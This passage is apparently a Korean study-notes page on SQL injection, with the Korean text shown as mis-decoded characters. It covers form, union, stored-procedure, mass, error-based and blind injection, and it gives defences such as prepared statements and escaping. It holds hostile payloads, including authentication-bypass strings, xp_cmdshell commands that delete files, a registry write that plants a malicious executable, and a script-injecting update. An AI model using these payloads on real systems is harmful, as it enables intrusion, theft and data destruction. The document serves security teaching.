I"ól<h1 id="sql-injection">SQL Injection</h1>

<h2 id="sql-injection-1">SQL Injection</h2>
<ul>
  <li>ê°œìš”
    <ul>
      <li>ì½”ë“œ ì¸ì ì…˜ì˜ í•œ ê¸°ë²•ìœ¼ë¡œ í´ë¼ì´ì–¸íŠ¸ì˜ ì…ë ¥ê°’ì„ ì¡°ì‘í•˜ì—¬ ì„œë²„ì˜ ë°ì´í„°ë² ì´ìŠ¤ ê³µê²©
        <ul>
          <li>ì˜ˆ) ì›¹í˜ì´ì§€ ë¡œê·¸ì¸ í¼ì˜ ID/PW ì…ë ¥ë€ì— SQL ì¿¼ë¦¬ë¥¼ ì‚½ì…</li>
        </ul>
      </li>
      <li>ê³µê²©ì´ ì‰¬ìš´ë° ë¹„í•´ íŒŒê´´ë ¥ì´ ê°•í•˜ê¸° ë•Œë¬¸ì— ì‹œíì–´ì½”ë”©ì˜ ê¸°ë³¸ì¤‘ í•˜ë‚˜</li>
      <li>Injection ê³„ì—´ ì·¨ì•½ì ë“¤ì€ í…ŒìŠ¤íŠ¸ë¥¼ í†µí•œ ë°œê²¬ì€ ì–´ë ¤ìš°ë‚˜ ìŠ¤ìºë‹íˆ´ì´ë‚˜ ì½”ë“œ ê²€ì¦ì ˆì°¨ë¥¼ ê±°ì¹˜ë©´ ë³´í†µ ì‰½ê²Œ ë°œê²¬ë˜ê¸° ë•Œë¬¸ì— íƒì§€í•˜ê¸° ì‰¬ìš´ í¸
        <ul>
          <li>ìŠ¤ìºë‹ íˆ´
            <ul>
              <li>Nikto : GNU ì˜¤í”ˆì†ŒìŠ¤, ì›¹ì„œë²„, Injection ë“± ì·¨ì•½ì  ì ê²€</li>
              <li>SQLMap (Python) : ë¸”ë¼ì¸ë“œ SQL Injection ì ê²€</li>
              <li>Absinthe : ë¸”ë¼ì¸ë“œ SQL Injection ì ê²€</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>ì…ë ¥ ê°’ í•„í„°ë§ì´ ì œëŒ€ë¡œ ì´ë£¨ì–´ì§€ì§€ ì•ŠëŠ” ê²½ìš° ë°œìƒ</li>
    </ul>
  </li>
  <li>Web Application ì˜ ì¼ë°˜ì ì¸ ì¸ì¦ ì ˆì°¨
    <ul>
      <li>ID/PW ì…ë ¥</li>
      <li>SQL Query ìƒì„±</li>
      <li>Database ì— ì¿¼ë¦¬ ì „ì†¡</li>
      <li>Database ì—ì„œ ì¿¼ë¦¬ ì‹¤í–‰</li>
    </ul>
  </li>
  <li>ê³µê²©ë°©ì‹ì— ë”°ë¥¸ ë¶„ë¥˜
    <ul>
      <li>Form SQL Injection
        <ul>
          <li>êµ¬ì¡°
            <ul>
              <li>HTML
                <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      &lt;form&gt;
          &lt;input /&gt;
          &lt;submit&gt;
      &lt;/form&gt;
</code></pre></div>                </div>
              </li>
              <li>ì›¹ì„œë²„
                <ul>
                  <li>PHP, JSP, ASP ì²˜ë¦¬</li>
                  <li>ì¿¼ë¦¬ë¬¸ ìƒì„±</li>
                  <li>WHERE ì ˆì„ TRUE ë¡œ ë§Œë“ ë‹¤ (ê³µê²©ì˜ˆì‹œ)</li>
                </ul>
              </li>
              <li>DB</li>
            </ul>
          </li>
          <li>ì£¼ì„ì²˜ë¦¬ë¬¸ì
            <ul>
              <li>MySQL : # , MSSQL : â€“, ORACLE : â€“</li>
            </ul>
          </li>
          <li>URL ì¸ì½”ë”© (<code class="language-plaintext highlighter-rouge">%xx</code> ë¡œ í‘œê¸°, xx ëŠ” 16ì§„ìˆ˜)
            <ul>
              <li><code class="language-plaintext highlighter-rouge">#</code> -&gt; %23</li>
              <li><code class="language-plaintext highlighter-rouge">-</code> -&gt; %2D</li>
              <li><code class="language-plaintext highlighter-rouge">'</code> -&gt; %27</li>
              <li><code class="language-plaintext highlighter-rouge">=</code> -&gt; %3D</li>
              <li>ê³µë°± -&gt; <code class="language-plaintext highlighter-rouge">+</code> í˜¹ì€ %20</li>
              <li>ë„ë¬¸ì -&gt; %00</li>
              <li><code class="language-plaintext highlighter-rouge">;</code> -&gt; %3B</li>
            </ul>
          </li>
          <li>ì·¨ì•½ì  ìˆëŠ”ì§€ ì—¬ë¶€ íŒŒì•… ë°©ë²•
            <ul>
              <li>ID ì…ë ¥ ë€ì— <code class="language-plaintext highlighter-rouge">'</code> ë‚˜ <code class="language-plaintext highlighter-rouge">"</code> ì…ë ¥ í›„ í…ŒìŠ¤íŠ¸
                <ul>
                  <li>Error ë©”ì‹œì§€ê°€ ì¶œë ¥ë˜ë©´ ì…ë ¥ ê°’ì´ DBì— ì „ë‹¬ëœ ê²ƒ (ì…ë ¥ê²€ì¦ X) : ì·¨ì•½</li>
                </ul>
              </li>
            </ul>
          </li>
          <li>ì˜ˆì‹œ
            <ul>
              <li>PHP ì½”ë“œ (ë¡œê·¸ì¸ì²˜ë¦¬)
                <ul>
                  <li>ì·¨ì•½í•œ ì½”ë“œ ì˜ˆì‹œ
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $query = select id, pw from member where id='$id' and pw='$pw';
  $result = mysql_query($query, $connect);
  $num_rows = mysql_num_rows($result);
  if($num_rows) {
      $row = mysql_fetch_array($result);
      $id = $row[id];
      echo "ë¡œê·¸ì¸ ì„±ê³µ";
  } else {
      echo "ë¡œê·¸ì¸ ì‹¤íŒ¨";
  }
</code></pre></div>                    </div>
                  </li>
                  <li>ì‚¬ìš©ìê°€ ì…ë ¥í•œ ê°’ì„ ê·¸ëŒ€ë¡œ ë³€ìˆ˜ì— ë‹´ì•„ì˜´</li>
                  <li>ë³€ìˆ˜ì— <code class="language-plaintext highlighter-rouge">' or 1=1 #</code> ì…ë ¥í•  ê²½ìš°
                    <ul>
                      <li>ID : <code class="language-plaintext highlighter-rouge">' or 1=1 #</code></li>
                      <li>pW : <code class="language-plaintext highlighter-rouge">test</code>
                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select id, pw from member where id='' or 1=1#and pw='test';
</code></pre></div>                        </div>
                      </li>
                    </ul>
                  </li>
                  <li>URI ì¸ì½”ë”© ë©”ì‹œì§€ (HTTP ìš”ì²­ë©”ì‹œì§€)
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">id=' or 1=1#</code></li>
                      <li><code class="language-plaintext highlighter-rouge">id=%27+or+1%3d1%23</code></li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>ëŒ€ì‘ì±…
            <ul>
              <li>PHP ì„¤ì •íŒŒì¼ : php.ini
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">magic_quotes_gpc=on</code> : GET, POST, Cookie ë¡œ ì „ë‹¬ë˜ëŠ” ë°ì´í„°ì— <code class="language-plaintext highlighter-rouge">'</code>(Single quote), <code class="language-plaintext highlighter-rouge">"</code>(Double quote), <code class="language-plaintext highlighter-rouge">\</code>(Back slash), ``(Null)(0x00) íŠ¹ìˆ˜ë¬¸ìë¥¼ ì¼ë°˜ë¬¸ìë¡œ ì²˜ë¦¬ (Escape ì²˜ë¦¬)</li>
                  <li>5.4 ë²„ì „ ì´ìƒì—ì„œëŠ” ì„¤ì •ê°’ì´ ì—†ê³ , mysql_real_escape_string() í•¨ìˆ˜ (MySQL ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜) ë¥¼ ì´ìš©
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $id = mysql_real_escape_string($id)
      $pw = mysql_real_escape_string($pw)
      $query = select id, pw from member where id='$id' and pw='$pw';
</code></pre></div>                    </div>
                    <ul>
                      <li>ê²°ê³¼ : <code class="language-plaintext highlighter-rouge">select id, pw from member where id='\' or 1=1#'</code></li>
                    </ul>
                  </li>
                </ul>
              </li>
              <li>Prepared Statement (ì„ ì²˜ë¦¬ ì§ˆì˜ë¬¸)
                <ul>
                  <li>ë™ì ìœ¼ë¡œ ì¿¼ë¦¬ë¥¼ ìƒì„±í•˜ì§€ ì•ŠìŒ</li>
                  <li>ì‚¬ìš©ìì˜ ì…ë ¥ê°’ì„ ë°”ì¸ë”© ì²˜ë¦¬
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $stmt=$conn-&gt;prepare("select id, pw from member where id=? and pw=?");
      $stmt-&gt;bind_param($id, $pw);
      $stmt-&gt;execute();
</code></pre></div>                    </div>
                  </li>
                  <li>ì…ë ¥ê°’ì„ ì œì™¸í•˜ê³  ì‚¬ì „ ì»´íŒŒì¼ ì²˜ë¦¬</li>
                  <li>ì…ë ¥ê°’ì€ ëª…ë ¹ì–´ê°€ ì•„ë‹Œ ì…ë ¥ê°’ìœ¼ë¡œë§Œ ì²˜ë¦¬</li>
                </ul>
              </li>
              <li>íŒŒë¼ë¯¸í„° í•„í„°ë§ì„ ì´ìš©í•œ SQL Injection ë°©ì§€
                <ul>
                  <li>ë¸”ë™ë¦¬ìŠ¤íŠ¸ ìƒì„±
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      function chk_blacklist($str){
          $returnVal = false;
          $blist = array('\'','\"','#','--','union','selector','update','or','and','insert','update')

          ###for ë¬¸ ì²´í¬
              if í¬í•¨ $returnVal = true; break;
          ###

          return $returnVal;
      }

      $chk_id = chk_blacklist($id);
      $chk_pw = chk_blacklist($pw);
      if (chk_id || chk_pw){
          ...
      }
</code></pre></div>                    </div>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Union SQL Injection
        <ul>
          <li>Union ëª…ë ¹ì–´
            <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      select id, pw from member where id='test';
      select id, pw from member where id='test' union select 'test', '1212'; -- ê²°ê³¼ê°’ì´ ê°™ì„ ê²½ìš° í•˜ë‚˜ë¡œ í‘œê¸°
      select id, pw from member where id='test' union all select 'test', '1212'; -- ê²°ê³¼ê°’ì´ ê°™ì„ ê²½ìš° ì¤‘ë³µ í‘œê¸°
      select id, pw from member where id='' union select 'test','1234';
</code></pre></div>            </div>
            <ul>
              <li>ì¡°ê±´ : Union ì€ í•„ë“œì˜ ê°œìˆ˜ê°€ ë˜‘ê°™ì•„ì•¼ ê²°í•© ê°€ëŠ¥</li>
            </ul>
          </li>
          <li>ì»¬ëŸ¼ì„ íŒŒì•…í•  ë•Œ ì‚¬ìš©í•˜ëŠ” ëª…ë ¹
  <code class="language-plaintext highlighter-rouge">select * from member where id='' order by 4#;</code>
            <ul>
              <li>Error code : Unknown column â€˜4â€™ in â€˜order clauseâ€™ (í•„ë“œê°€ 3ê°œë¼ íŒë‹¨)</li>
            </ul>
          </li>
          <li>ê³µê²©ë°©ì‹
            <ul>
              <li>id ë¶€ë¶„ì— <code class="language-plaintext highlighter-rouge">' union select 'test', '1234'#</code> ì…ë ¥
                <ul>
                  <li>ì˜¤ë¥˜ì—†ì´ ì¸ì¦ ìš°íšŒ ê°€ëŠ¥</li>
                </ul>
              </li>
            </ul>
          </li>
          <li>ì˜ˆì‹œ : ê°’ ë¹„êµë¥¼ í†µí•œ form SQL Injection ë°©ì–´ ì½”ë“œ
            <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $query = "select id, pw from member where id=$id";
      $result = mysql_query($query, $conn);
      $num_rows = mysql_num_rows($result);
      if($num_rows) {
          $row = mysql_fetch_array($result);
          $id = $row[id];
          $rec_pw = $row[pw]; // ì²«ë²ˆì§¸ ë ˆì½”ë“œì˜ pw ê°’ì„ ì €ì¥
          if($pw != $rec_pw) {echo "ë¡œê·¸ì¸ì‹¤íŒ¨"} else {echo "ë¡œê·¸ì¸ì„±ê³µ"}
      }
</code></pre></div>            </div>
            <ul>
              <li>Union SQL Injection ì— ì·¨ì•½
                <ul>
                  <li>id : <code class="language-plaintext highlighter-rouge">' union' select 'test', 'test' #</code></li>
                  <li>pw : <code class="language-plaintext highlighter-rouge">test</code></li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Stored Procedure SQL Injection
        <ul>
          <li>ì €ì¥ í”„ë¡œì‹œì €ëŠ” ì—¬ëŸ¬ ì¿¼ë¦¬ë¬¸ì„ í•˜ë‚˜ì˜ í•¨ìˆ˜ì²˜ëŸ¼ ì‹¤í–‰í•˜ì—¬ ì‚¬ìš©í•˜ëŠ” ì¿¼ë¦¬ì˜ ì§‘í•©ì„ ì˜ë¯¸</li>
          <li>íŠ¹ì • ì‘ì—…ì„ ì¼ê´„ ì²˜ë¦¬í•˜ê¸° ìœ„í•œ ìš©ë„ë¡œ ì‚¬ìš©</li>
          <li>ëª…ë ¹ì–´
            <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      exec master..xp_cmdshell 'dir c:\'
      exec master..xp_cmdshell 'del c:\ /q/s'
</code></pre></div>            </div>
            <ul>
              <li><code class="language-plaintext highlighter-rouge">exec master.dbo.xp_cmdshell 'ì‹œìŠ¤í…œëª…ë ¹ì–´'</code></li>
              <li>í™•ì¥í˜• ì €ì¥í”„ë¡œì‹œì €
                <ul>
                  <li>xp_cmdshell
                    <ul>
                      <li>ê´€ë¦¬ìì˜ ê¶Œí•œìœ¼ë¡œ ì„ì˜ì˜ ëª…ë ¹ì„ ìˆ˜í–‰</li>
                    </ul>
                  </li>
                  <li>xp_regwrite
                    <ul>
                      <li>ë ˆì§€ìŠ¤íŠ¸ë¦¬ ì‘ì„±</li>
                    </ul>
                  </li>
                  <li><code class="language-plaintext highlighter-rouge">exec master.dbo.xp_dirtree 'c:\'</code>
                    <ul>
                      <li>ë””ë ‰í† ë¦¬ êµ¬ì¡°</li>
                    </ul>
                  </li>
                  <li>ê³µê²©ì˜ˆì‹œ
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">aaa.php?tt=1234;exec master.dbo.xp_cmdshell 'ping 192.168.10.0'</code>
                        <ul>
                          <li>ë’¤ì˜ ëª…ë ¹ë„ ì‹¤í–‰ë¨.</li>
                        </ul>
                      </li>
                      <li><code class="language-plaintext highlighter-rouge">aaa.php?tt=1234;exec xp_regwrite 'HKEY_LOCAL_MACHINE','\software\microsoft\window...','winhelp',REG_SZ,'c:\temp\hac.exe'</code>
                        <ul>
                          <li>ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ ì‘ì„±, ìœˆë„ìš° ë„ì›€ë§ì„ ë³¼ ë•Œ ì•…ì„±ì½”ë“œ ì‹¤í–‰</li>
                          <li><code class="language-plaintext highlighter-rouge">c:\temp\hac.exe</code> : ê³µê²©ìê°€ ì‹¬ì–´ë†“ì€ ì•…ì„±ì½”ë“œ</li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Mass SQL Injection
        <ul>
          <li>ê¸°ì¡´ì˜ SQL-Injection ê¸°ë²•ë³´ë‹¤ í™•ì¥ëœ ê°œë…</li>
          <li>ë³´ì•ˆì¥ë¹„ì™€ í•„í„°ë§ ì„¤ì •ì„ ìš°íšŒí•˜ëŠ” ê¸°ë²• (2ê°€ì§€ ë°©ë²•)
            <ul>
              <li>ê³µê²©ì¿¼ë¦¬ì˜ ì¼ë¶€ë¶„ì„ HEX ì¸ì½”ë”©</li>
              <li>ì „ì²´ ì¿¼ë¦¬ë¥¼ HEX ì¸ì½”ë”©</li>
            </ul>
          </li>
          <li>ëŒ€ëŸ‰ì˜ DBê°’ì´ ë³€ì¡°ë˜ì–´ í™ˆí˜ì´ì§€ì— ì¹˜ëª…ì ì¸ ì•…ì˜í–¥</li>
          <li>DBê°’ ë³€ì¡°ì‹œ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…
            <ul>
              <li>ì‚¬ìš©ìë“¤ì´ ë³€ì¡°ëœ ì‚¬ì´íŠ¸ë¥¼ ë°©ë¬¸ì‹œ ê°ì—¼</li>
              <li>BOTì´ ì„¤ì¹˜ë˜ì–´ ê³„ì • í•´í‚¹ì´ë‚˜ DDOS ê³µê²©ì— ì´ìš©</li>
            </ul>
          </li>
          <li>ëŒ€ìƒ
            <ul>
              <li>ê³µê²©ëŒ€ìƒì´ MS-SQL ì„ ì‚¬ìš©</li>
              <li>ASP ê°€ ê°€ë™ì¤‘ì¸ IIS ì›¹ì„œë²„</li>
            </ul>
          </li>
          <li>íŠ¹ì§•
            <ul>
              <li>ë°ì´í„°ë² ì´ìŠ¤ì— ì•…ì„±ì½”ë“œë¥¼ ëŒ€ëŸ‰ìœ¼ë¡œ ì‚½ì…</li>
              <li>ìë™ ì‚½ì… ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ í•œë²ˆì— ì•…ì„±ì½”ë“œë¥¼ ëŒ€ëŸ‰ ì‚½ì…</li>
              <li>POST ë‚˜ HTTP Header (ì¿ í‚¤, ë¦¬í¼ëŸ¬) ë¥¼ ì´ìš©í•œ ê²½ìš° ê³µê²© ë¡œê·¸ë¥¼ ì°¾ê¸° ì–´ë ¤ì›€</li>
              <li>ì•…ì„±ì½”ë“œ ì‚½ì… ê³¼ì •ì—ì„œ ë°ì´í„°ì˜ ì†ì‹¤ ë°œìƒ</li>
              <li><code class="language-plaintext highlighter-rouge">&lt;script src=...&gt;&lt;/script&gt;</code> íƒœê·¸ë¥¼ ì‚½ì…, js, swf, exe íŒŒì¼</li>
              <li>HEX ì½”ë“œë¡œ ì¸ì½”ë”© ë³€í™˜
                <ul>
                  <li>ëŒ€ìƒ ì½”ë“œ
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      begin
          exec ('update' + @t + ' set' + @c + " = " &lt;script&gt; document.location = "http://www.xxx.com"&lt;/script&gt;'")
      end
</code></pre></div>                    </div>
                  </li>
                  <li>FW ë“±ì˜ í•„í„°ë§ì„ ìš°íšŒ</li>
                </ul>
              </li>
            </ul>
          </li>
          <li>ëŒ€ì‘ë°©ë²•
            <ul>
              <li>declare êµ¬ë¬¸ì„ ì´ìš©í•œ ê³µê²©ë°©ì‹ ì°¨ë‹¨
                <ul>
                  <li>ìœ„í•´ ì›¹ ì†ŒìŠ¤ìƒì˜ ì¿¼ë¦¬ìŠ¤íŠ¸ë§ ê¸¸ì´ ì œí•œ</li>
                  <li>ì†ŒìŠ¤ì½”ë“œ ìˆ˜ì • (ì¤‘-ì¥ê¸° ëŒ€ì‘ë°©ì•ˆ)</li>
                  <li>ì…ë ¥ë¬¸ìì˜ í•„í„°ë§</li>
                  <li>DB, System ì •ê¸° ë°±ì—…</li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>ê³µê²©ìœ í˜•ì— ë”°ë¥¸ ë¶„ë¥˜
    <ul>
      <li>ì—ëŸ¬ ê¸°ë°˜ SQL Injection
        <ul>
          <li>ê°œìš”
            <ul>
              <li>DB ì¿¼ë¦¬ ê²°ê³¼ì˜ ì—ëŸ¬ê°’ì„ ì´ìš©í•˜ì—¬ ì›í•˜ëŠ” ì •ë³´ë¥¼ ì ì§„ì ìœ¼ë¡œ ì–»ì–´ë‚˜ê°</li>
              <li>DB ì—ëŸ¬ê°€ ì™¸ë¶€ë¡œ ë…¸ì¶œë˜ëŠ” ì·¨ì•½ì ì„ ì´ìš©í•œ ê³µê²©</li>
              <li>Error ë©”ì‹œì§€ë¥¼ ë…¸ì¶œí•˜ì§€ ì•Šìœ¼ë©´ ì‚¬ìš©í•  ìˆ˜ ì—†ìŒ</li>
            </ul>
          </li>
          <li>ì˜ˆì‹œ
            <ul>
              <li>í…Œì´ë¸”ëª… ë° í•„ë“œëª… íšë“
                <ul>
                  <li>having ì´ìš©
                    <ul>
                      <li>ê²€ìƒ‰ ì°½ì´ ìˆì„ ì‹œ
                        <ul>
                          <li><code class="language-plaintext highlighter-rouge">select * from member ... </code></li>
                        </ul>
                      </li>
                      <li>group by ì ˆì´ ì»¬ëŸ¼ì„ ê¸°ì¤€ìœ¼ë¡œ ê·¸ë£¹ì„ ë§Œë“¤ ë•Œ having ì€ ê²°ê³¼ë¥¼ í•œë²ˆ ë” í•„í„°ë§</li>
                      <li>` having 1=1 â€“`</li>
                      <li>ì˜¤ë¥˜ë©”ì‹œì§€ : member.idx ì—´ì´ ì§‘ê³„í•¨ìˆ˜ë‚˜ Group by ì ˆì— ì—†ìœ¼ë¯€ë¡œ select ëª©ë¡ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ì—†ìŒâ€¦ â€˜??? ì˜ line ?ë²ˆâ€™
                        <ul>
                          <li>member : í…Œì´ë¸”ëª…</li>
                          <li>idx : í•„ë“œëª…</li>
                        </ul>
                      </li>
                      <li><code class="language-plaintext highlighter-rouge">group by idx --</code></li>
                      <li>ì˜¤ë¥˜ë©”ì‹œì§€ : member.bId ì—´ì´ ì§‘ê³„í•¨ìˆ˜ë‚˜ Group by ì ˆì— ì—†ìœ¼ë¯€ë¡œ select ëª©ë¡ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ì—†ìŒâ€¦ â€˜??? ì˜ line ?ë²ˆâ€™</li>
                      <li><code class="language-plaintext highlighter-rouge">group by idx, bid --</code> â€¦</li>
                    </ul>
                  </li>
                </ul>
              </li>
              <li>ì»¬ëŸ¼(í•„ë“œ) íƒ€ì… íšë“
                <ul>
                  <li>sum() ì´ìš© : ìˆ«ìí˜•ì¸ì§€ ì—¬ë¶€</li>
                  <li>union ì´ìš©
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">union select sum(ì»¬ëŸ¼ëª…) from member --</code></li>
                      <li>ì˜¤ë¥˜ë©”ì‹œì§€ : ìˆ«ìíƒ€ì…ì˜ í•„ë“œ(ì»¬ëŸ¼) -&gt; ë™ì¼ ê°œìˆ˜ì˜ ì‹ì´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.</li>
                      <li>ì˜¤ë¥˜ë©”ì‹œì§€ : VARCHAR íƒ€ì…ì˜ í•„ë“œ(ì»¬ëŸ¼) -&gt; sum or avarage ì—°ì‚°ì—ì„œëŠ” varchar íƒ€ì… ë°ì´í„° í˜•ì‹ì„ ì¸ìˆ˜ë¡œ ì‚¬ìš©í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.</li>
                    </ul>
                  </li>
                  <li>í•„ë“œì˜ ê°œìˆ˜ë¥¼ ì•Œê³  ìˆì„ ë•Œ í•„ë“œì˜ íƒ€ì…ì„ íšë“í•˜ëŠ” ë°©ë²•
                    <ul>
                      <li>union select ì— NULL ì„ í™œìš©</li>
                      <li><code class="language-plaintext highlighter-rouge">union select NULL,NULL,NULL,NULL from member</code></li>
                      <li><code class="language-plaintext highlighter-rouge">union select 1,NULL,NULL,NULL from member</code>
                        <ul>
                          <li>ì—ëŸ¬ê°€ ì—†ìœ¼ë©´ ì²«ë²ˆì§¸ ì»¬ëŸ¼ì€ Int í˜•</li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                  <li>í•„ë“œì˜ ê°œìˆ˜ê°€ íŒŒì•…ë˜ë©´ ID, PW ë¥¼ ë°›ì•„ì˜¬ ìˆ˜ ìˆìŒ
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">union select idx, name, password, ...</code></li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Blind SQL Injection
        <ul>
          <li>ê°œìš”
            <ul>
              <li>ì¿¼ë¦¬ì˜ ê²°ê³¼ê°€ ì°¸ì¸ì§€ ê±°ì§“ì¸ì§€ì˜ ë°˜ì‘ìœ¼ë¡œ ì·¨ì•½ì  ë°œê²¬</li>
              <li>Limit ì—°ì‚°, substr(ë¬¸ìì—´ ìë¥´ê¸°), ASCII(ì•„ìŠ¤í‚¤ ì½”ë“œ ë°˜í™˜) ë“± í•¨ìˆ˜ë¥¼ ì´ìš©</li>
              <li>ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ê³  í•„ë“œê°’ì´ë‚˜ í…Œì´ë¸” ëª…ì„ ì¶”ì¸¡í•˜ì—¬ ê³µê²©</li>
            </ul>
          </li>
          <li>ì˜ˆì‹œ
            <ul>
              <li>ì¿¼ë¦¬ë¶€ë¶„ ì˜ˆ (PHP)
                <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $query = "select * from bbs
      where $find like '%$search%"
      order by idx desc";
</code></pre></div>                </div>
                <ul>
                  <li>ì„¤ëª…
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">$search</code> : ì‚¬ìš©ìê°€ ì…ë ¥í•œ ê²€ìƒ‰ì–´</li>
                      <li><code class="language-plaintext highlighter-rouge">$find</code> : ì œëª©, ë‚´ìš©, ì‘ì„±ì, ë‚´ìš©+ì œëª© ë“±</li>
                    </ul>
                  </li>
                  <li>ê²€ìƒ‰ì–´ì— <code class="language-plaintext highlighter-rouge">' and 1=1#</code> ì…ë ¥ ì‹œ
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">where $find like '%' and 1=1#%</code>
                        <ul>
                          <li><code class="language-plaintext highlighter-rouge">$find like '%'</code> : True</li>
                          <li><code class="language-plaintext highlighter-rouge">1=1</code> : True</li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                  <li>ê²€ìƒ‰ì–´ì— <code class="language-plaintext highlighter-rouge">' and 1=2#</code> ì…ë ¥ ì‹œ
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">where $find like '%' and 1=1#%</code>
                        <ul>
                          <li><code class="language-plaintext highlighter-rouge">$find like '%'</code> : True</li>
                          <li><code class="language-plaintext highlighter-rouge">1=2</code> : False</li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                  <li>True ì™€ False ì— ëŒ€í•œ ê²°ê³¼ë¡œ BlindSQL Injection ê°€ëŠ¥ì—¬ë¶€ë¥¼ íŒë‹¨</li>
                </ul>
              </li>
              <li>ìŠ¤í‚¤ë§ˆ
                <ul>
                  <li>Information_schema : DBì˜ êµ¬ì¡°, ì œì•½ì¡°ê±´ ë“± ë©”íƒ€ ë°ì´í„°ë¥¼ ì œê³µ</li>
                  <li>Information_schema.tables : ëª¨ë“  í…Œì´ë¸”ì— ëŒ€í•œ ì •ë³´</li>
                  <li>Information_shcema.columns : ëª¨ë“  í…Œì´ë¸”ì˜ ì»¬ëŸ¼ì •ë³´</li>
                </ul>
              </li>
              <li>í•¨ìˆ˜
                <ul>
                  <li>limit : ì¶œë ¥ ë ˆì½”ë“œì˜ ê°œìˆ˜ë¥¼ ì œí•œí•˜ëŠ” í•¨ìˆ˜ (ex:limit pos,len)</li>
                  <li>substr : ë¬¸ìì—´ì„ ì¶”ì¶œí•˜ëŠ” í•¨ìˆ˜ (ex:substr(ë¬¸ìì—´, pos, len))
                    <ul>
                      <li>pos : ì‹œì‘ìœ„ì¹˜ / len : ë¬¸ìê°œìˆ˜
                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select table_schema, table_name, table_type from information_schema.tables
  where table_type = 'base table' -- ì‚¬ìš©ìê°€ ë§Œë“  í…Œì´ë¸”
  limit 0,1 ;
</code></pre></div>                        </div>
                      </li>
                      <li>ì‚¬ìš©ìê°€ ë§Œë“  í…Œì´ë¸”ì„ ì²˜ìŒë¶€í„° 1ê°œ ê°€ì ¸ì˜¤ê¸°
                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select substr((select table_name from information_shcema.tables where table_type = 'base table' limit 0, 1), 1, 1) from dual;
</code></pre></div>                        </div>
                      </li>
                      <li>ì‚¬ìš©ìê°€ ë§Œë“  í…Œì´ë¸”ëª…ì„ ì²˜ìŒë¶€í„° 1ê°œ ê°€ì ¸ì™€ì„œ ì•ìë¦¬ í™•ì¸
                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select column_name from information_schema.columns
  where table_name = 'employee' 
  limit 0, 1;
</code></pre></div>                        </div>
                      </li>
                      <li>í…Œì´ë¸”ëª…ì´ â€˜employeeâ€™ ì¸ ì»¬ëŸ¼ëª…ì„ ì²˜ìŒë¶€í„° 1ê°œ ê°€ì ¸ì˜¤ê¸°</li>
                    </ul>
                  </li>
                </ul>
              </li>
              <li>í™œìš©ë²•
                <ul>
                  <li>ê²€ìƒ‰ì°½ì— ì…ë ¥
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">' and substr((select table_name from information_schema.tables where table_type='base table' limit 0,1),1,1)='a'#</code></li>
                    </ul>
                  </li>
                  <li>ì™„ì„± ì¿¼ë¦¬ ë‚´ìš©
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      select * from bbs where subhect like '%
      ' and substr((select table_name from information_schema.tables where table_type='base table' limit 0,1),1,1)='a'#%'
</code></pre></div>                    </div>
                    <ul>
                      <li>ê²€ìƒ‰ ê²°ê³¼ê°’ì´ ë‚˜ì˜¤ë©´ ì°¸, ê²°ê³¼ê°’ì´ ì—†ìœ¼ë©´ ê±°ì§“</li>
                      <li>ìë™í™”ëœ íˆ´ì„ ì´ìš©í•´ì„œ í…Œì´ë¸” ì •ë³´ë¥¼ íŒŒì•…</li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>ê³¼ì •
            <ul>
              <li>Table ì •ë³´ -&gt; í•„ë“œ(Column) ì •ë³´ -&gt; Data íšë“
                <ul>
                  <li>information_schema.tables, information_schema.columns, union select ì´ìš©</li>
                </ul>
              </li>
              <li>í…Œì´ë¸”ëª… íšë“
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">' and substr((select table_name ...),1,1)='a'#</code></li>
                  <li><code class="language-plaintext highlighter-rouge">%27+and+substr%28%28select+table_name...</code>
